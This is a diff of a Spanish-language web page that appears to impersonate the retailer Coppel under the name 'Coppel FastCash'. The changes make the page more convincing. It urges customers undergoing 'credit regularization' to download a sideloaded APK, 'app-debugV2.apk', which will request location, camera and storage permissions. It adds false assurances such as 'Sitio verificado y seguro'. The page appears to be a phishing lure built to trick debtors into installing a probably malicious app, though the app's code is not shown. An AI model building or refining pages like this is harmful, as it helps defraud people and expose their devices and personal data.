@@ -4,66 +4,113 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Coppel FastCash - Descarga Oficial</title>
+  <link rel="icon" href="logo.png" type="image/png">
+
   <style>
+    :root {
+      --coppel-yellow: #fdd835;
+      --coppel-blue: #003366;
+      --bg-light: #f4f4f4;
+    }
+
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', sans-serif;
       background-color: #ffffff;
-      color: #003366;
+      color: var(--coppel-blue);
       margin: 0;
       padding: 0;
     }
+
     header {
-      background-color: #fdd835;
+      background-color: var(--coppel-yellow);
       padding: 20px;
       text-align: center;
     }
+
+    header img {
+      max-height: 60px;
+      margin-bottom: 10px;
+    }
+
     header h1 {
       margin: 0;
-      color: #003366;
+      font-size: 1.4rem;
     }
+
     .container {
       max-width: 600px;
       margin: 40px auto;
-      padding: 20px;
-      background-color: #f4f4f4;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 25px 20px;
+      background-color: var(--bg-light);
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
     }
+
     .container p {
-      font-size: 18px;
+      font-size: 1rem;
+      line-height: 1.6;
     }
+
+    .highlight {
+      font-weight: bold;
+      color: var(--coppel-blue);
+    }
+
     .download-btn {
-      display: inline-block;
-      margin-top: 20px;
-      background-color: #003366;
+      display: block;
+      width: 100%;
+      text-align: center;
+      background-color: var(--coppel-blue);
       color: #ffffff;
-      padding: 15px 30px;
+      padding: 16px;
       font-size: 18px;
+      font-weight: bold;
       text-decoration: none;
-      border-radius: 5px;
+      border-radius: 8px;
+      margin-top: 30px;
+      transition: background-color 0.3s ease;
     }
+
+    .download-btn:hover {
+      background-color: #002244;
+    }
+
     footer {
       text-align: center;
-      padding: 10px;
-      background-color: #fdd835;
-      color: #003366;
+      padding: 12px;
+      background-color: var(--coppel-yellow);
+      color: var(--coppel-blue);
+      font-size: 0.9rem;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+      }
+
+      .download-btn {
+        font-size: 16px;
+        padding: 14px;
+      }
     }
   </style>
 </head>
+
 <body>
   <header>
-    <h1>Coppel FastCash</h1>
-    <p>Portal Oficial de Descarga</p>
+    <img src="logo.png" alt="Coppel FastCash Logo">
+    <h1>Portal de Descarga Oficial</h1>
   </header>
 
   <div class="container">
-    <p>Bienvenido al sistema de conciliación de pagos Coppel FastCash.</p>
-    <p>Para continuar, descargue nuestra app móvil oficial y siga las instrucciones.</p>
-    <a class="download-btn" href="app-debugV2.apk" download>📥 Descargar App</a>
+    <p>Bienvenido al sistema de conciliación de pagos <span class="highlight">Coppel FastCash</span>.</p>
+    <p>Este portal es exclusivo para clientes en proceso de regularización de crédito.</p>
+    <p>Para completar su validación, debe descargar la aplicación oficial y seguir las instrucciones en pantalla. Se solicitarán permisos de ubicación, cámara y almacenamiento para verificar identidad.</p>
+    <a class="download-btn" href="app-debugV2.apk" download>📥 Descargar App Segura</a>
   </div>
 
   <footer>
-    <p>© 2025 Coppel FastCash. Todos los derechos reservados.</p>
+    © 2025 Coppel FastCash. Sitio verificado y seguro.
   </footer>
 </body>
 </html>
